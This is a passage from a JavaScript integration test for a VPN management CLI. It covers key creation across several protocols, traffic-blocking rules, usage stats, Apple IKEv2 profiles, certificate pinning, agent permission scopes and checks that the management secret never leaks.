  assert.equal(imported.data.imported.kind, 'amneziawg'); assert.equal(imported.data.access_key, undefined);
  const vlessFile = path.join(temp, 'alice-vless.txt');
  const saved = await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'vless', '--output', vlessFile]);
  assert.equal(saved.data.access_key, undefined); assert.ok((await fs.readFile(vlessFile, 'utf8')).startsWith('vless://'));
  assert.equal((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'vless', '--output', vlessFile], 2)).error.code, 'invalid_request', 'never overwrites a file');
  const wgFile = path.join(temp, 'alice-wg.txt');
  await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'wireguard', '--output', wgFile]);
  assert.ok((await fs.readFile(`${wgFile}.conf`, 'utf8')).startsWith('[Interface]'));
  // FILE.conf is checked before the server creates a key (the key count below stays 4).
  const taken = path.join(temp, 'alice-awg.txt'); await fs.writeFile(`${taken}.conf`, 'kept');
  assert.equal((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'amneziawg', '--output', taken], 2)).error.code, 'invalid_request');
  await assert.rejects(fs.access(taken)); assert.equal(await fs.readFile(`${taken}.conf`, 'utf8'), 'kept');
  assert.equal((await cli(['profile', 'import', `${wgFile}.conf`, '--name', 'alice-wg'])).data.kind, 'wireguard');
  const printed = await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'shadowsocks']);
  assert.ok(printed.data.access_key.startsWith('ss://') && printed.data.access_key.includes('outline=1'));
  await cli(['key', 'add', '--name', 'alice-ss', '--file', await write('alice-ss.txt', printed.data.access_key)]);
  assert.equal((await cli(['key', 'add', '--name', 'alice-vless', '--file', vlessFile])).data.kind, 'vless');
  const keys = await cli(['server', 'keys', 'list', '--server', 'home', '--user', user]);
  assert.equal(keys.data.length, 4); assert.ok(keys.data.every(k => k.access_key === undefined && k.config === undefined));
  assert.ok((await cli(['server', 'keys', 'list', '--server', 'home', '--user', user, '--show-keys'])).data.every(k => k.access_key));

  assert.deepEqual((await cli(['server', 'rules', 'set', '--server', 'home', '--block-site', '*.Example.COM', '--block-bittorrent'])).data.blocked_domains, ['example.com']);
  await cli(['server', 'rules', 'set', '--server', 'home', '--user', user, '--block-port', '6881-6889']);
  assert.deepEqual((await cli(['server', 'rules', 'show', '--server', 'home', '--user', user])).data.rules.blocked_ports, ['6881-6889']);
  assert.equal((await cli(['server', 'rules', 'set', '--server', 'home', '--block-ip', 'nonsense'], 2)).error.code, 'invalid_request');
  assert.equal((await cli(['server', 'usage', '--server', 'home'])).data.users[0].usage_bytes, 0);
  assert.equal((await cli(['server', 'set', '--server', 'home', '--disable', 'wireguard'])).data.protocols.wireguard.enabled, false);
  assert.ok((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'wireguard'], 2)).error.message.includes('turned off'));
  assert.equal((await cli(['server', 'users', 'update', '--server', 'home', '--user', user, '--disable'])).data.enabled, false);
  assert.equal((await cli(['server', 'users', 'update', '--server', 'home', '--user', '99', '--enable'], 2)).error.code, 'not_found');
  assert.equal((await cli(['server', 'info', '--server', 'missing'], 2)).error.code, 'not_found');

  // Monitoring, QR codes and connection kits through the daemon.
  const live = await cli(['server', 'live', '--server', 'home']);
  assert.equal(live.data.users[0].name, 'Alice'); assert.equal(typeof live.data.health.uptime_seconds, 'number');
  const stats = await cli(['server', 'stats', '--server', 'home', '--user', user, '--range', '24h']);
  assert.equal(stats.data.range, '24h'); assert.equal(stats.data.site_stats, false); assert.ok(Array.isArray(stats.data.types));
  assert.equal((await rpc({ schema_version: 1, action: { type: 'server_call', server: 'home', op: { op: 'stats', range: 'forever' } } })).error.code, 'invalid_request');
  assert.ok(Array.isArray((await cli(['server', 'clients', '--server', 'home'])).data.clients));
  const qr = await cli(['server', 'keys', 'qr', '--server', 'home', '--user', user, '--key', keys.data[0].id]);
  assert.ok(qr.data.help_text.includes('▀') || qr.data.help_text.includes('█'));
  const kitFile = path.join(temp, 'alice-kit.html');
  assert.equal((await cli(['server', 'keys', 'kit', '--server', 'home', '--user', user, '--output', kitFile])).data.saved_to, kitFile);
  const kit = await fs.readFile(kitFile, 'utf8');
  assert.ok(kit.includes('<!doctype html>') && kit.includes('vless://') && kit.includes('<svg'));
  assert.equal((await cli(['server', 'set', '--server', 'home', '--site-stats', 'on', '--history-days', '60'])).data.site_stats, true);
  assert.equal((await cli(['server', 'info', '--server', 'home'])).data.history_days, 60);

  // IKEv2/IPsec (built-in VPN of iPhone, iPad and Mac) need the IPsec component; their keys are
  // saved as Apple profiles. A fresh status file stands in for the component here.
  assert.ok((await cli(['server', 'set', '--server', 'home', '--enable', 'ikev2'], 2)).error.message.includes('ipsec enable'));
  await fs.mkdir(path.join(dir, 'ipsec'), { recursive: true });
  await fs.writeFile(path.join(dir, 'ipsec', 'status.json'), JSON.stringify({ version: 1, updated_unix: Math.floor(Date.now() / 1000), running: true, sas: [] }));
  const appleOn = await cli(['server', 'set', '--server', 'home', '--enable', 'ikev2', '--enable', 'ipsec']);
  assert.ok(appleOn.data.protocols.ikev2.enabled && appleOn.data.protocols.ipsec.enabled && appleOn.data.ipsec_component.running);
  const ikev2 = await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'ikev2', '--auth', 'certificate', '--remote-id', 'vpn.example.test']);
  assert.equal(ikev2.data.auth, 'certificate'); assert.equal(ikev2.data.remote_identifier, 'vpn.example.test'); assert.ok(!ikev2.data.access_key, 'no access key, only a profile');
  assert.equal((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'ipsec', '--import', 'phone'], 2)).error.code, 'invalid_request', 'IKEv2/IPsec keys are never imported here');
  assert.equal((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'ikev2', '--auth', 'psk'], 2)).error.code, 'invalid_request');
  assert.ok((await cli(['server', 'keys', 'create', '--server', 'home', '--user', user, '--protocol', 'ipsec', '--auth', 'psk'])).data.warning.includes('weak'));
  const profileFile = path.join(temp, 'alice.mobileconfig');
  const profileArgs = ['server', 'keys', 'profile', '--server', 'home', '--user', user, '--key', ikev2.data.id, '--output', profileFile];
  assert.equal((await cli(profileArgs)).data.saved_to, profileFile);
  const profile = await fs.readFile(profileFile, 'utf8');
  assert.ok(profile.includes('com.apple.vpn.managed') && profile.includes('com.apple.security.pkcs12') && profile.includes('<string>vpn.example.test</string>'));
  assert.equal((await cli(profileArgs, 2)).error.code, 'invalid_request', 'never overwrites a file');
  assert.ok((await cli(['server', 'keys', 'list', '--server', 'home', '--user', user])).data.every(k => k.certificate_password === undefined));
  await cli(['server', 'set', '--server', 'home', '--rotate-ipsec-psk']);

  // A server that cannot prove it holds the pinned certificate never receives the key.
  const wrongPin = await cli(['server', 'add', '--name', 'evil', '--key-file', await write('wrong-pin.json', JSON.stringify({ ...management, certSha256: '00'.repeat(32) }))], 1);
  assert.equal(wrongPin.error.code, 'server_identity_mismatch');
  for (const bad of [{ ...management, apiUrl: management.apiUrl.replace('https:', 'http:') }, { apiUrl: management.apiUrl }, { ...management, extra: 1 }]) {
    const refused = await cli(['server', 'add', '--name', 'bad', '--key-file', await write('bad-key.json', JSON.stringify(bad))], 2);
    assert.equal(refused.error.code, 'invalid_request'); assert.ok(!JSON.stringify(refused).includes(secret));
  }
  const tokenPath = path.join(temp, 'server.token'); await cli(['agent', 'grant', '--name', 'server-agent', '--control', '--token-file', tokenPath]);
  const token = (await fs.readFile(tokenPath, 'utf8')).trim();
  // A valid control token, so it is the operation's scope that refuses these.
  const ops = [{ op: 'info' }, { op: 'live' }, { op: 'kit', user }, { op: 'key_profile', user, key: '1' }];
  for (const action of [{ type: 'managed_server_list' }, ...ops.map(op => ({ type: 'server_call', server: 'home', op })), { type: 'managed_server_add', name: 'x', management_key: key }]) {
    const refused = (await rpc({ schema_version: 1, agent_token: token, action })).error;
    assert.equal(refused.code, 'permission_denied', JSON.stringify(action)); assert.match(refused.message, /capability/);
  }
  await cli(['agent', 'revoke', '--name', 'server-agent']);
  assert.ok(!JSON.stringify(await cli(['logs', '--tail', '1000'])).includes(secret), 'audit log contains the management secret');

  server.kill(); await once(server, 'exit');
  assert.equal((await cli(['server', 'info', '--server', 'home'], 1)).error.code, 'server_unreachable');
  assert.equal((await cli(['server', 'remove', '--name', 'home'])).data.removed, 'home');
  assert.equal((await cli(['server', 'list'])).data.servers.length, 0);
  for (const name of ['alice-awg', 'alice-wg', 'alice-ss', 'alice-vless']) await cli(['profile', 'remove', name]);
});
